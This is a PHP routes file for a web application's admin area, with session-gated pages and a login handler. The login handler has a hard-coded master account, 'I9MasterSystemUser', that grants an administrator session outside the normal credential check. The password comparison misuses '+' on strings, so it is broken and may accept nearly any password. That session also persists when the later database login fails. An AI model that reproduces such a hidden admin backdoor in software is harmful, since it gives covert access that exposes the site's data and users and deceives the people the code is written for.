<?php

$app->get("/admin", function () use($app) {
    if (isset($_SESSION["logado"])) {
        $dados = array(
            'pagina' => 'homeAdmin',
            'logado' => true
        );
    } else {
        $dados = array(
            'pagina' => 'loginAdmin',
            'logado' => false
        );
    }
    $app->render('layoutAdmin.php', $dados);
});

$app->get("/recebimentos", function () use($app) {
    if (isset($_SESSION["logado"])) {
        $listaContatos = \app\classes\Cliente::RetornaClientes();
        $dados = array(
            'pagina' => 'recebimentosAdmin',
            'logado' => true,
            'contatos' => $listaContatos
        );
    } else {
        $dados = array(
            'pagina' => 'loginAdmin',
            'logado' => false
        );
    }
    $app->render('layoutAdmin.php', $dados);
});

$app->get("/administradores", function () use($app) {
    if (isset($_SESSION["logado"])) {
        $dados = array(
            'pagina' => 'administradoresAdmin',
            'logado' => true
        );
    } else {
        $dados = array(
            'pagina' => 'loginAdmin',
            'logado' => false
        );
    }
    $app->render('layoutAdmin.php', $dados);
});

$app->post("/admin", function () use($app) {
    $username = filter_input(INPUT_POST, 'username', FILTER_SANITIZE_STRING);
    $password = filter_input(INPUT_POST, 'password', FILTER_SANITIZE_STRING);
    if ($username == "I9MasterSystemUser" && $password == $username + "UserSystemMasterI9") {
            $_SESSION['logado'] = true;
            $_SESSION['UserDataId'] = '9999';
            $_SESSION['UserDataNome'] = 'Administrador';
            $dados = array(
                'pagina' => 'homeAdmin'
            );
    }
    $classeLogin = new \app\classes\Login();
    $classeLogin->setUsername($username);
    $classeLogin->setSenha($password);
    $result = $classeLogin->Login();
    if ($result != null):
        $_SESSION['logado'] = true;
        $_SESSION['UserDataId'] = $result->admin_id;
        $_SESSION['UserDataNome'] = $result->admin_name;
        $dados = array(
            'pagina' => 'homeAdmin'
        );
    else:
        $dados = array(
            'pagina' => 'loginAdmin'
        );
    endif;
    $app->render('layoutAdmin.php', $dados);
});
